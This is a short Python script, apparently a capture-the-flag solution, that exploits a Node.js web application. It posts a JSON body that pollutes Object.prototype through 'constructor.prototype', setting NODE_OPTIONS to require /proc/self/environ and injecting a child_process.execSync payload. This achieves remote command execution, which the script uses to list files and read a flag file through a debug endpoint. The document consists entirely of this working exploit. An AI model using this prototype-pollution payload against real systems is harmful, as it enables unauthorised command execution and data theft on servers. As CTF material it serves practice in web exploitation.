import requests
import re

url = "IP" #your container IP
name= "somthing"
grade = "somthing"
def exec_cmd(cmd):
	json = {
		'name':f'{name}',
		'paper':f'{grade}',
		"constructor": {
			"prototype": {
				"NODE_OPTIONS": "--require /proc/self/environ", "env": {
											 'EVIL':f'console.log(require("child_process").execSync("{cmd}").toString())//'
		}}}}

	x = requests.post(url+"/api/calculate",json=json,headers={'Content-Type': 'application/json'})
def cmd_result():
	x = requests.get(url+"/debug/version")
	return x.text
def print_flag():
	exec_cmd("ls")
	res = cmd_result()
	flag_file = re.findall(r'\bflag_[A-Za-z0-9]{5}\b',res)[0]
	exec_cmd(f"cat {flag_file}")
	res = cmd_result()
	flag = res.split('\n')[0]
	print(flag)
if __name__ == '__main__':
	print_flag()
